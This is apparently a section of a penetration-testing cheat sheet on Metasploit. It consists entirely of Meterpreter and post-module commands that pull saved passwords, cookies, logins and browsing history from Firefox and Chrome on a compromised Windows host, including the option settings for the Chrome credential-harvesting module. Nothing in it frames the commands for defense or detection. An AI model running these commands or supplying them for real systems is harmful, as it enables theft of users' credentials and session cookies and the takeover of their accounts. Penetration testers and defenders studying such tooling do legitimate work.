# 04 - Metasploit

## 4.1 - All Browsers

`meterpreter > run windows/gather/forensics/browser_history`

## 4.2 - Firefox

```
meterpreter > run enum_firefox

meterpreter > run post/firefox/gather/cookies timeout=180

meterpreter > run post/firefox/gather/history timeout=180

meterpreter > run post/firefox/gather/passwords timeout=180

meterpreter > run post/multi/gather/firefox_creds decrypt=[false | true]
```

## 4.3 - Google Chrome

### 4.3.1 - Meterpreter

`meterpreter > run post/windows/gather/enum_chrome migrate=[true | false]`

### 4.3.2 - Post Module

```
msf > use post/windows/gather/credentials/chrome

msf post(windows/gather/credentials/chrome) > options

Module options (post/windows/gather/credentials/chrome):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ARTIFACTS     All              no        Type of artifacts to collect (Accepted: All, cookies, logins, web_history)
   EXTRACT_DATA  true             no        Extract data and stores in a separate file
   REGEX         ^password        no        Match a regular expression
   SESSION                        yes       The session to run this module on
   STORE_LOOT    true             no        Store artifacts into loot database

msf post(windows/gather/credentials/chrome) > set artifacts [All | cookies | logins | web_history]

msf post(windows/gather/credentials/chrome) > set extract_data [true | false]

msf post(windows/gather/credentials/chrome) > set store_loot [true | false]

msf post(windows/gather/credentials/chrome) > set regex [regular_expression]

msf post(windows/gather/credentials/chrome) > set session <session_id>

msf post(windows/gather/credentials/chrome) > run
```